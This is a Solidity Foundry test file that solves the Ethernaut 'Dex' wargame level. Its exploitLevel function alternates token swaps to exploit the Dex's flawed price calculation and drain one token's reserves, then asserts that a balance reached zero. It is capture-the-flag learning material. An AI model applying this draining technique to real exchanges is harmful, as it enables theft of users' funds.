// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Dex} from "../../src/22/Dex.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {DexFactory} from "src/22/DexFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract DexTest is Test, BaseTest {
    Dex public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new DexFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Dex(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        instanceContract.approve(address(instanceContract), type(uint256).max);
        uint256 balanceDexToken1;
        uint256 balanceDexToken2;

        while (
            instanceContract.balanceOf(instanceContract.token1(), address(instanceContract)) > 0
                && instanceContract.balanceOf(instanceContract.token2(), address(instanceContract)) > 0
        ) {
            balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
            balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));
            uint256 maxToken1BalanceUser = instanceContract.balanceOf(instanceContract.token1(), player);
            uint256 maxToken2BalanceDex = ((maxToken1BalanceUser * balanceDexToken2) / balanceDexToken1);

            if (balanceDexToken2 > maxToken2BalanceDex) {
                instanceContract.swap(
                    instanceContract.token1(),
                    instanceContract.token2(),
                    instanceContract.balanceOf(instanceContract.token1(), player)
                );
            } else {
                instanceContract.swap(instanceContract.token1(), instanceContract.token2(), balanceDexToken1);
            }
            balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
            balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));
            uint256 maxToken2BalanceUser = instanceContract.balanceOf(instanceContract.token2(), player);
            uint256 maxToken1BalanceDex = ((maxToken2BalanceUser * balanceDexToken1) / balanceDexToken2);

            if (balanceDexToken1 > maxToken1BalanceDex) {
                instanceContract.swap(
                    instanceContract.token2(),
                    instanceContract.token1(),
                    instanceContract.balanceOf(instanceContract.token2(), player)
                );
            } else {
                instanceContract.swap(instanceContract.token2(), instanceContract.token1(), balanceDexToken2);
            }
        }

        vm.stopPrank();

        balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
        balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));

        assert(balanceDexToken1 == 0 || balanceDexToken2 == 0);
    }
}
